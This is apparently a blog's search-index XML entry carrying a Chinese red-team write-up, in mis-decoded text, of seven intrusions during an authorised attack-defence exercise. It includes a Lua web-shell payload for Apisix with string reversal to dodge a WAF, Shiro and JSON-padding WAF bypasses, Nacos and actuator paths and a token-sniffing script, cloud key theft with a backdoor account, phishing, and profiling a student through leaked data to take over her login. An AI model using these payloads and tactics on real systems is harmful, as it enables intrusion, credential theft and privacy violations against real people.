<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æŸå¤´éƒ¨ç›´è¾–å¸‚æ”»é˜²æ¼”ç»ƒçºªå®-å¦‚ä½•ä¸ç”¨0dayæ‰“ä¸‹nä¸ªç‚¹</title>
      <link href="/2023/12/01/%E6%9F%90%E5%A4%B4%E9%83%A8%E7%9B%B4%E8%BE%96%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%BA%AA%E5%AE%9E-%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A80day%E6%89%93%E4%B8%8Bn%E4%B8%AA%E7%82%B9/"/>
      <url>/2023/12/01/%E6%9F%90%E5%A4%B4%E9%83%A8%E7%9B%B4%E8%BE%96%E5%B8%82%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%BA%AA%E5%AE%9E-%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A80day%E6%89%93%E4%B8%8Bn%E4%B8%AA%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‡ ä¸ªæœˆå‰æ‰“äº†ä¸€åœºæŸåœ°çš„æ”»é˜²æ¼”ç»ƒï¼Œæ¼”ç»ƒå½“æ—¶é€šçŸ¥çš„å¾ˆæ€¥ä¿ƒï¼Œæ²¡åšä»€ä¹ˆå‡†å¤‡ç›´æ¥å°ç±³åŠ æ­¥æªä¸Šé˜µäº†â€¦</p><p>åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¤šä¸ªæ²¡ç”¨åˆ°0dayçš„æ‰“ç‚¹æ¡ˆä¾‹éƒ½å¾ˆæœ‰æ„æ€ï¼Œä¸‹é¢å°±ç®€å•åˆ†äº«ä¸€ä¸‹</p><h2 id="æ¡ˆä¾‹ä¸€ã€æŸå•ä½shiroç»•WAF-åˆ©ç”¨shiroå¤„ç†rememberMeå­—æ®µå€¼çš„feature"><a href="#æ¡ˆä¾‹ä¸€ã€æŸå•ä½shiroç»•WAF-åˆ©ç”¨shiroå¤„ç†rememberMeå­—æ®µå€¼çš„feature" class="headerlink" title="æ¡ˆä¾‹ä¸€ã€æŸå•ä½shiroç»•WAF(åˆ©ç”¨shiroå¤„ç†rememberMeå­—æ®µå€¼çš„feature)"></a>æ¡ˆä¾‹ä¸€ã€æŸå•ä½shiroç»•WAF(åˆ©ç”¨shiroå¤„ç†rememberMeå­—æ®µå€¼çš„feature)</h2><p>ä¿¡æ¯æœé›†åˆ°æŸå•ä½çš„CASç³»ç»Ÿâ€¦å½“æ—¶å¼€ç€Burpsuiteæ’ä»¶ï¼Œæ‰«åˆ°äº†é»˜è®¤çš„shiroç§˜é’¥</p><p>å½“æ—¶å¼€å¿ƒåäº†â€¦ä½†æ˜¯æœ‰é¥é¥é¢†å…ˆå‚å•†çš„WAFåœ¨ï¼Œå¦‚æœç›´æ¥ä¸Šç°æˆçš„å·¥å…·ä¼šç›´æ¥å¯„</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201458493.png" alt="image-20231120145846021" style="zoom:50%;" /><p>åé¢è¯•äº†è¯•ç½‘ä¸Šå…¬å¼€çš„æ–¹æ³•ï¼Œç›´æ¥æŠŠè¯·æ±‚æ–¹å¼åˆ æ‰ï¼Œä¾ç„¶è¢«æ‹¦ï¼ŒåŒ…ç›´æ¥è¢«é‡ç½®æ‰ï¼Œæ— å¥ˆå¯»æ‰¾æ–°faeture</p><p>æœ€ç»ˆåœ¨Shiroçš„rememberMeå­—æ®µå€¼å¤„ç†æµç¨‹ä¸­ï¼Œå‘ç°åœ¨Base64è§£ç è¿‡ç¨‹ä¸­æœ‰æˆ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508131.png" alt="img"></p><p>å¦‚å›¾ï¼Œåœ¨shiroè§£ç base64å­—ç¬¦ä¸²çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨discardNonBase64æ–¹æ³•å»é™¤æ‰éBase64çš„å­—ç¬¦</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508372.png" alt="img"></p><p>å¦‚å›¾æ‰€ç¤º</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508487.png" alt="img"></p><p>é‚£ä¹ˆæ€è·¯å°±æ¥äº†ï¼Œåªéœ€å¾€rememberMeå­—æ®µçš„å€¼ä¸­å¡«å……éBase64çš„å­—ç¬¦å³å¯ç»•è¿‡WAF(æ¯”å¦‚$ç¬¦å·)</p><pre><code>Base64åŒ…æ‹¬å°å†™å­—æ¯a-z,å¤§å†™å­—æ¯A-Z,æ•°å­—0-9,ç¬¦å·+å’Œ/ç»„æˆçš„64ä¸ªå­—ç¬¦çš„å­—ç¬¦é›†,å¦å¤–åŒ…æ‹¬å¡«å……å­—ç¬¦=</code></pre><p>åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæœç„¶å¥æ•ˆ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201508902.png" alt="img"></p><p>é‚£ä¹ˆåé¢å°±å¾ˆç®€å•äº†ï¼ŒæŠŠç°æˆçš„Shiroåˆ©ç”¨å·¥å…·é…ç½®Burpsuiteçš„ä»£ç†ï¼ŒMatch&amp;Replaceæ›¿æ¢éƒ¨åˆ†å­—ç¬¦ä¸²å³å¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201511950.png" alt="image-20231120151135911"></p><p>æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸæ‹¿ä¸‹Shellï¼Œåªå¯æƒœè¿‡äº†åŠå°æ—¶å°±è¢«åº”æ€¥äº†â€¦</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201512617.png" alt="img"></p><h2 id="æ¡ˆä¾‹äºŒã€æŸäº’è”ç½‘å‚å•†-Apisixç»•é˜¿é‡ŒWAFæ‹¿ä¸‹28ä¸ªRce"><a href="#æ¡ˆä¾‹äºŒã€æŸäº’è”ç½‘å‚å•†-Apisixç»•é˜¿é‡ŒWAFæ‹¿ä¸‹28ä¸ªRce" class="headerlink" title="æ¡ˆä¾‹äºŒã€æŸäº’è”ç½‘å‚å•† Apisixç»•é˜¿é‡ŒWAFæ‹¿ä¸‹28ä¸ªRce"></a>æ¡ˆä¾‹äºŒã€æŸäº’è”ç½‘å‚å•† Apisixç»•é˜¿é‡ŒWAFæ‹¿ä¸‹28ä¸ªRce</h2><p>å¦‚å›¾ä½¿ç”¨äº†apisixç½‘å…³çš„WebServeråœ¨ç”¨æˆ·è®¿é—®ä¸å­˜åœ¨çš„è·¯ç”±æ—¶ï¼Œä¼šæŠ›å‡ºå¦‚ä¸‹é”™è¯¯ï¼Œè¿™å¯ä»¥ä½œä¸ºæˆ‘ä»¬æŒ‡çº¹è¯†åˆ«çš„ç‰¹å¾æ‰€åœ¨</p><pre><code>&#123;  &quot;error_msg&quot;: &quot;404 Route Not Found&quot;&#125;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201516744.png" alt="img"></p><p>é’ˆå¯¹ApisixèŠ‚ç‚¹çš„æ”»å‡»æ–¹æ³•ï¼Œæƒ³è¦RCEçš„è¯ï¼Œå†å²ä¸Šä¸»è¦æœ‰â€œé»˜è®¤X-API-Keyâ€å’Œâ€œDashboardæœªæˆæƒè®¿é—®â€ä¸¤ä¸ªæ´å¯ä»¥ç”¨</p><p>è¿‡å¾€æŒ–æŸSRCçš„æ—¶å€™ï¼Œå°±é‡åˆ°è¿‡é»˜è®¤X-API-Keyå¯¼è‡´å¯ç›´æ¥åˆ›å»ºæ‰§è¡Œluaä»£ç çš„æ¶æ„è·¯ç”±çš„é—®é¢˜</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201519275.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201520158.png" alt="img"></p><p>æ°å·§è¿™æ¬¡æ”»é˜²æ¼”ç»ƒä¸­ï¼ŒæŸç›®æ ‡å­åŸŸçš„Apisixï¼Œæ­£å¥½å°±å­˜åœ¨Dashboardçš„æœªæˆæƒè®¿é—®</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201522994.png" alt="image-20231120152222856" style="zoom:50%;" /><p>ç›´æ¥å»Githubæ‰’äº†ä¸€ä¸ªè„šæœ¬ï¼Œå‘ç°èƒ½æ£€æµ‹å‡ºæ¼æ´ï¼Œä½†æ˜¯RCEåˆ©ç”¨ä¸æˆåŠŸï¼ŒæŠŠreponseæ‰“å°å‡ºæ¥åï¼Œæœç„¶â€¦è¢«é˜¿é‡Œäº‘çš„WAFç»™æ‹¦äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201523524.png" alt="img"></p><p>éšåæŠŠåˆ›å»ºæ¶æ„è·¯ç”±çš„è¯·æ±‚åŒ…ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªå¸¦æœ‰å¤§é‡è„æ•°æ®çš„Jsoné”®ï¼Œå‘ç°é˜¿é‡Œäº‘ä¸æ‹¦äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201525926.png" alt="image-20231120152555881"></p><p>ç”¨ä¹‹å‰çš„Dashboardæœªæˆæƒè®¿é—®æ¼æ´æŸ¥çœ‹è·¯ç”±ï¼Œæ˜¾ç¤ºæ¶æ„è·¯ç”±ç¡®å®æ˜¯è¢«å†™å…¥äº†â€¦ä½†æ˜¯ç›´æ¥è®¿é—®æ¶æ„è·¯ç”±å´ä¾ç„¶æç¤º404</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201528596.png" alt="image-20231120152857545"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201530171.png" alt="image-20231120153028126"></p><p>é€šè¿‡æœªæˆæƒè®¿é—®æ¼æ´ï¼Œè·å–å…¨é‡è·¯ç”±é…ç½®åï¼Œå‘ç°ç›®æ ‡apisixåº”è¯¥æ˜¯é›†ç¾¤éƒ¨ç½²çš„â€¦</p><pre><code>/apisix/admin/migrate/export</code></pre><p>æ¯ä¸ªè·¯ç”±éœ€è¦æœ‰ä¸€ä¸ªhosté”®æ¥ç¡®å®šè¯¥è·¯ç”±è¢«æ·»åŠ åˆ°å“ªä¸ªå­åŸŸ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221200399.png" alt="image-20231120153214811"></p><p>éšåå†æ¬¡æ„é€ å†™å…¥æ¶æ„è·¯ç”±çš„æ•°æ®ï¼ŒæŠŠhosté”®åŠ ä¸Šï¼Œå‘ç°å¯ä»¥æˆåŠŸå†™å…¥äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201534485.png" alt="image-20231120153424427"></p><p>åˆ©ç”¨æœªæˆæƒæ¥å£è¯»å‡ºå…¨é‡è·¯ç”±configï¼Œå¹¶æå–å‡ºhosté”®ï¼Œç¡®å®šå¯å†™å…¥æ¶æ„è·¯ç”±çš„å­åŸŸèŒƒå›´</p><pre><code>import jsondef read_config():    with open(&quot;data.json&quot;, &#39;r&#39;) as json_file:        config = json.load(json_file)    return configdata = read_config()if &quot;Routes&quot; in data:    for route in data[&quot;Routes&quot;]:        if &quot;host&quot; in route:            host_value = route[&quot;host&quot;]            with open(&quot;data.txt&quot;, &quot;a&quot;) as file:                file.write(host_value + &quot;\n&quot;)                print(host_value)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221102603.png" alt="image-20231122110158076"></p><p>ä½†æ˜¯åé¢æ‰§è¡Œå‘½ä»¤ï¼Œæœ‰çš„æ—¶å€™ä¼šè¢«é˜¿é‡Œäº‘ç»™æ‹¦æ‰ï¼Œäºæ˜¯æ„é€ luaè„šæœ¬æ—¶æŠŠä¼ å‚å’Œå‘½ä»¤è¾“å‡ºåšäº†å€’è½¬ï¼Œé˜²æ­¢è¢«æµé‡æ£€æµ‹åˆ°</p><pre><code class="lua">local file=io.popen(string.reverse(ngx.req.get_headers()[&#39;Authenication&#39;]),&#39;r&#39;)local output=file:read(&#39;*all&#39;)file:close()ngx.say(string.reverse(output))</code></pre><p>ç”±äºè¯¥apisixé›†ç¾¤éƒ¨ç½²ç®¡ç†äº†28ä¸ªå­åŸŸçš„æœåŠ¡ï¼Œæ‰€ä»¥æˆåŠŸæ‹¿ä¸‹28ä¸ªå­åŸŸRce</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201535765.png" alt="img"></p><h2 id="æ¡ˆä¾‹ä¸‰ã€æŸå¼€å‘å•†Nacosæœªæˆæƒè®¿é—®è¯»å–é…ç½®ä¿¡æ¯åˆ°ç²¾å‡†é’“é±¼è¿›å…¥å†…ç½‘"><a href="#æ¡ˆä¾‹ä¸‰ã€æŸå¼€å‘å•†Nacosæœªæˆæƒè®¿é—®è¯»å–é…ç½®ä¿¡æ¯åˆ°ç²¾å‡†é’“é±¼è¿›å…¥å†…ç½‘" class="headerlink" title="æ¡ˆä¾‹ä¸‰ã€æŸå¼€å‘å•†Nacosæœªæˆæƒè®¿é—®è¯»å–é…ç½®ä¿¡æ¯åˆ°ç²¾å‡†é’“é±¼è¿›å…¥å†…ç½‘"></a>æ¡ˆä¾‹ä¸‰ã€æŸå¼€å‘å•†Nacosæœªæˆæƒè®¿é—®è¯»å–é…ç½®ä¿¡æ¯åˆ°ç²¾å‡†é’“é±¼è¿›å…¥å†…ç½‘</h2><p>åˆ©ç”¨nacosæœªæˆæƒè®¿é—®ï¼Œä»CONFIG.INFOè¯»å–configä¿¡æ¯</p><p>å¾ˆå¹¸è¿ï¼Œå…¶ä¸­åŒ…å«å…¬æœ‰äº‘æ•°æ®åº“å‡­æ®</p><pre><code>/nacos/v1/cs/ops/derby?sql=select+*+from+CONFIG_INFO+st</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539001.png" alt="img"></p><p>å¯æƒœè¯•äº†ä¸€ä¸‹éƒ½é…äº†ç­–ç•¥ï¼Œæ²¡æ³•å¤–ç½‘ç›´æ¥è¿è¿‡å»</p><p>ä½†æ˜¯â€¦å´å‘ç°äº†configä¿¡æ¯ä¸­ï¼Œå‡ºç°äº†æŸç³»ç»Ÿçš„ä¸€ä¸ªæ‰‹æœºå·</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539163.png" alt="img"></p><p>éšååŠ ä¸Šå¾®ä¿¡é’“é±¼ï¼Œä»¥ç³»ç»Ÿå‡çº§ä¸ºç”±ï¼ŒæˆåŠŸæ‹¿åˆ°æƒé™</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539225.png" alt="img" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201539618.png" alt="img" style="zoom:50%;" /><h2 id="æ¡ˆä¾‹å››ã€æŸå›½ä¼-ä»ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–åˆ°SSOæ²¦é™·"><a href="#æ¡ˆä¾‹å››ã€æŸå›½ä¼-ä»ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–åˆ°SSOæ²¦é™·" class="headerlink" title="æ¡ˆä¾‹å››ã€æŸå›½ä¼-ä»ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–åˆ°SSOæ²¦é™·"></a>æ¡ˆä¾‹å››ã€æŸå›½ä¼-ä»ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–åˆ°SSOæ²¦é™·</h2><p>æŸå›½ä¼å­åŸŸçš„èµ„äº§ï¼Œå‘ç°ä½¿ç”¨äº†kkfileviewå¼€æºé¡¹ç›®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221111402.png" alt="image-20231122111118350"></p><p>ç¿»äº†ä¸€ä¸‹å†å²issueï¼Œå­˜åœ¨å…¨å›æ˜¾çš„ssrfï¼Œåœ¨ç›®æ ‡ä¸ŠéªŒè¯æˆåŠŸ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201541504.png" alt="img"></p><p>åŒæ—¶å¾ˆå¹¸è¿ï¼Œè¿™ä¸ªç‚¹æ”¯æŒfile:&#x2F;&#x2F;åè®®ï¼Œéšåé€šè¿‡fileåè®®è¯»å–åˆ°ç½‘ç«™é…ç½®æ–‡ä»¶ï¼Œæ‹¿åˆ°äº†ç›®æ ‡çš„AK,SK</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201550394.png" alt="image-20231120155009326"></p><p>ä½¿ç”¨é˜¿é‡Œäº‘çš„Cliåˆ›å»ºåé—¨è´¦æˆ·ï¼Œæ¥ç®¡ç›®æ ‡å…¬æœ‰äº‘</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201544358.png" alt="img"></p><p>åŒæ—¶åœ¨rootç›®å½•ï¼Œå‘ç°æœ‰è¯¸å¤šæ•°æ®åº“æ–‡ä»¶</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201543028.png" alt="img" style="zoom:50%;" /><p>è¯»å‡ºå¤šä¸ªsqlæ–‡ä»¶å†…å®¹åï¼Œæœ‰äº›åº“ä¸­å­˜æ”¾çš„å‘˜å·¥å¯†ç æ˜¯å¼±åŠ å¯†çš„</p><p>å€Ÿæ­¤æˆ‘ä»¬æŒæ¡äº†éƒ¨åˆ†å‘˜å·¥çš„å§“åï¼Œå·¥å·ï¼Œæ˜æ–‡å¯†ç ï¼Œéƒ¨é—¨</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201550915.png" alt="img"></p><p>éšåä½¿ç”¨ITéƒ¨é—¨èŒçº§æ¯”è¾ƒé«˜çš„äººå‘˜çš„å·¥å·ã€å¯†ç ï¼ŒæˆåŠŸè¿›å…¥SSOç³»ç»Ÿï¼Œæ‹¥æœ‰ç®¡ç†æƒé™</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201552458.png" alt="img" style="zoom:50%;" /><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201552642.png" alt="img"></p><p>åé¢å°±å¾ˆç®€å•äº†ï¼Œåˆ›å»ºä¸€ä¸ªè´¦æˆ·ï¼ŒæŠŠæ‰€æœ‰äº§å“å’Œå¹³å°çš„æƒé™ç‚¹æ»¡â€¦</p><p>ç„¶åï¼Œç„¶åæ‰€æœ‰é€šè¿‡ssoç™»å½•çš„ç³»ç»Ÿéƒ½èƒ½è®¿é—®åˆ°äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201554221.png" alt="image-20231120155412165"></p><h2 id="æ¡ˆä¾‹äº”ã€å…µä¸è¡€åˆƒæ‰“ç©¿æŸé«˜æ ¡"><a href="#æ¡ˆä¾‹äº”ã€å…µä¸è¡€åˆƒæ‰“ç©¿æŸé«˜æ ¡" class="headerlink" title="æ¡ˆä¾‹äº”ã€å…µä¸è¡€åˆƒæ‰“ç©¿æŸé«˜æ ¡"></a>æ¡ˆä¾‹äº”ã€å…µä¸è¡€åˆƒæ‰“ç©¿æŸé«˜æ ¡</h2><p>ä¸ºä»€ä¹ˆè¯´å…µä¸è¡€åˆƒå‘¢â€¦å› ä¸ºç›®æ ‡é«˜æ ¡å¤–ç½‘æš´éœ²é¢å¾ˆå°ï¼ŒåŸºæœ¬ä¸Šæ”»é˜²æ¼”ç»ƒæœŸé—´èƒ½å…³çš„éƒ½å…³äº†</p><p>ä½†æ˜¯ç›®æ ‡é«˜æ ¡æ­£å€¼å¼€å­¦å­£ï¼Œå¼€æ”¾äº†ä¸€ä¸ªç ”ç©¶ç”Ÿå­¦å·çš„æŸ¥è¯¢ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ç”¨ç ”ç©¶ç”Ÿçš„èº«ä»½è¯+å§“åæŸ¥è¯¢å­¦å·å’Œåˆå§‹å¯†ç </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201558675.png" alt="image-20231120155825627"></p><p>éšåæˆ‘å¼€å§‹æ¼«é•¿çš„ç™¾åº¦ä¹‹æ—…â€¦æœ€ç»ˆå®šä½åˆ°äº†ä¸€ååœ¨è¯¥æ ¡å°±è¯»çš„ç ”ç©¶ç”Ÿæ–°ç”Ÿå°å§å§</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201602766.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201602011.png" alt="img"></p><p>åˆ©ç”¨xxåº“çš„ç¥ç§˜åŠ›é‡ï¼Œæ‰¾åˆ°äº†å°å§å§çš„ä¿¡æ¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311231022017.png" alt="image.png"></p><p>æœ€ç»ˆæˆåŠŸæ‹¿åˆ°å°å§å§çš„å­¦å·å’Œåˆå§‹å¯†ç </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201603115.png" alt="img"></p><p>éå¸¸èµ°è¿ï¼Œå°å§å§æ²¡æœ‰æ”¹å¯†ç ï¼Œç›´æ¥è¿›å…¥åˆ°ssl vpnç³»ç»Ÿä¸­</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201604922.png" alt="image-20231120160448869"></p><p>åœ¨æŸä¸ªæŸ¥çœ‹å­¦ç”Ÿä¸ªäººä¿¡æ¯çš„ç³»ç»Ÿé‡ï¼Œé˜Ÿå‹çš„Burpè¢«åŠ¨æ‰«æåˆ°äº†ä¸€ä¸ªäºŒçº§ç›®å½•çš„swaggeræ–‡æ¡£</p><p>è€Œâ€œæ·»åŠ å­¦ç”Ÿä¿¡æ¯æŸ¥çœ‹è§’è‰²â€çš„æ¥å£ï¼Œç«Ÿç„¶æ˜¯æ²¡æœ‰é‰´æƒçš„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201605015.png" alt="img"></p><p>éšååˆ©ç”¨æ¥å£ï¼ŒæŠŠå½“å‰ç”¨æˆ·æ·»åŠ æŸ¥çœ‹å­¦ç”Ÿä¿¡æ¯çš„æƒé™</p><p>å¦‚å›¾ï¼Œæ‹¿ä¸‹å…¨æ ¡åä¸‡å­¦ç”Ÿçš„è¯¦ç»†ä¿¡æ¯~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201606224.png" alt="img"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201606864.png" alt="img"></p><h2 id="æ¡ˆä¾‹6ã€æŸå•ä½Gitlabé¡¹ç›®æƒé™è¯¯é…å¯¼è‡´å…¬æœ‰äº‘æ¥ç®¡"><a href="#æ¡ˆä¾‹6ã€æŸå•ä½Gitlabé¡¹ç›®æƒé™è¯¯é…å¯¼è‡´å…¬æœ‰äº‘æ¥ç®¡" class="headerlink" title="æ¡ˆä¾‹6ã€æŸå•ä½Gitlabé¡¹ç›®æƒé™è¯¯é…å¯¼è‡´å…¬æœ‰äº‘æ¥ç®¡"></a>æ¡ˆä¾‹6ã€æŸå•ä½Gitlabé¡¹ç›®æƒé™è¯¯é…å¯¼è‡´å…¬æœ‰äº‘æ¥ç®¡</h2><p>é˜²å®ˆå•ä½ä¸­æŸå•ä½çš„Gitlabå¼€æ”¾åˆ°äº†å…¬ç½‘ï¼Œä½†æ˜¯çˆ†ç ´äº†ä¸€é¡¿ï¼Œå¹¶ä¸å­˜åœ¨å¼±å£ä»¤</p><p>ä½†æ˜¯ç»è¿‡å¯¹Gitlabçš„æµ‹è¯•ï¼Œæ‰¾åˆ°äº†Gitlabä¸­ä»“åº“æƒé™çš„é…ç½®é—®é¢˜</p><pre><code>/api/v4/projects</code></pre><p>è·å–åˆ°gitlabä¸­éƒ¨åˆ†ä»“åº“ä¸ºpublicçŠ¶æ€ï¼Œéç™»å½•æ€å¯ç›´æ¥è®¿é—®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221405998.png" alt="image-20231122140539936"></p><p>å¦‚å›¾ï¼ŒæˆåŠŸè®¿é—®åˆ°æŸå†…éƒ¨é¡¹ç›®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201611451.png" alt="image-20231120161131396"></p><p>æœ€ç»ˆåœ¨æŸé¡¹ç›®ä¸­æˆåŠŸæ‰¾åˆ°äº†å¯ç”¨çš„ak,skï¼Œå®Œæˆå…¬æœ‰äº‘æ¥ç®¡</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311201613046.png" alt="img"></p><h2 id="æ¡ˆä¾‹ä¸ƒã€æŸå•ä½ç³»ç»Ÿä»ä¸€ä¸ªactuator-httptraceç«¯ç‚¹åˆ°åƒä¸‡é‡çº§æ•æ„Ÿä¿¡æ¯"><a href="#æ¡ˆä¾‹ä¸ƒã€æŸå•ä½ç³»ç»Ÿä»ä¸€ä¸ªactuator-httptraceç«¯ç‚¹åˆ°åƒä¸‡é‡çº§æ•æ„Ÿä¿¡æ¯" class="headerlink" title="æ¡ˆä¾‹ä¸ƒã€æŸå•ä½ç³»ç»Ÿä»ä¸€ä¸ªactuator httptraceç«¯ç‚¹åˆ°åƒä¸‡é‡çº§æ•æ„Ÿä¿¡æ¯"></a>æ¡ˆä¾‹ä¸ƒã€æŸå•ä½ç³»ç»Ÿä»ä¸€ä¸ªactuator httptraceç«¯ç‚¹åˆ°åƒä¸‡é‡çº§æ•æ„Ÿä¿¡æ¯</h2><p>æŒ‚ç€Burpä»£ç†ï¼Œè¢«åŠ¨æ‰«æåˆ°äº†ä¸€ä¸ªactuatoræ¥å£ï¼Œå¾ˆå¹¸è¿ï¼Œå¼€æ”¾äº†httptrace endpointï¼Œå€Ÿæ­¤æˆ‘ä»¬å¯ä»¥è·å–åˆ°ç³»ç»Ÿä¸­çš„httpè¯·æ±‚æ—¥å¿—</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221116337.png" alt="image-20231122111607300"></p><p>ä½†æ˜¯å‘ç°å¦‚å›¾ä¸Šæ–¹ä½¿ç”¨çš„é‰´æƒheaderå¹¶ä¸èƒ½ç›´æ¥è¿›å…¥åˆ°ç³»ç»Ÿä¸­</p><p>åˆšå¼€å§‹æ€€ç–‘æ˜¯é‰´æƒä¿¡æ¯çš„è¿‡æœŸæ—¶é—´è®¾ç½®çš„æ¯”è¾ƒçŸ­ï¼Œå†™äº†ä¸ªè„šæœ¬ç›‘æ§å¸¦æœ‰x-access-tokençš„æ–°å¢è¯·æ±‚</p><pre><code class="python">import requestsimport timemonitored_text = &quot;&quot;# URLurl = &quot;http://xxxxx.xxxxx.com/xxxxxx/actuator/httptrace/&quot;while True:    try:        response = requests.get(url)        page_text = response.text        new_content = page_text[len(monitored_text):]        # æ£€æŸ¥æ–°å¢çš„å†…å®¹æ˜¯å¦åŒ…å« &quot;x-access-token&quot; å­—ç¬¦ä¸²        if &quot;x-access-token&quot; in new_content:            current_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())            print(f&quot;æ–°å¢çš„å†…å®¹åŒ…å« &#39;x-access-token&#39; äº &#123;current_time&#125;&quot;)        monitored_text = page_text        time.sleep(1)    except Exception as e:        print(f&quot;error Info: &#123;e&#125;&quot;)</code></pre><p>æœ€ç»ˆæˆåŠŸæ‹¿åˆ°äº†ä¸€ä¸ªå¯ç”¨çš„tokenï¼Œå‘ç°æ˜¯JWTå½¢å¼çš„-_-||â€¦</p><p>åŸæ¥ä¹‹å‰æ‹¿åˆ°çš„tokenæ˜¯æµ‹è¯•æ•°æ®ï¼Œéš¾æ€ªç”¨ä¸äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221126096.png" alt="image-20231122112644041"></p><p>ä½¿ç”¨è¯¥JWTï¼Œé€šè¿‡webpackæå–åˆ°çš„apiï¼Œè®¿é—®åç«¯APIï¼Œæ‹¿ä¸‹å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼Œè¾¾åƒä¸‡é‡çº§ï¼Œé˜²æ­¢burpå¡æ­»ï¼Œä»…åˆ—å‡ºéƒ¨åˆ†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202311221408646.png" alt="image-20231122140805594"></p><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2><p>ä¸æ–­æå‡æ”»å‡»é¢çš„å¹¿åº¦ä¸æ·±åº¦ï¼Œæ˜¯ä¸€åhackerçš„æ ¸å¿ƒç´ å…»</p><p>æ”»é˜²ä¹‹ä¸­ï¼Œæ‹¥æœ‰å……è¶³çš„ç»éªŒï¼Œè€Œåˆä¸é™·å…¥ç»éªŒä¸»ä¹‰çš„è¿‚è…ï¼Œé¢å¯¹ä¸‡éš¾ï¼Œè€Œåˆä¸æ”¾å¼ƒæ€è€ƒï¼Œæ˜¯å‡ºå¥‡åˆ¶èƒœçš„å…³é”®æ‰€åœ¨</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCloudVrp-top7-2022-Study-and-Ideas</title>
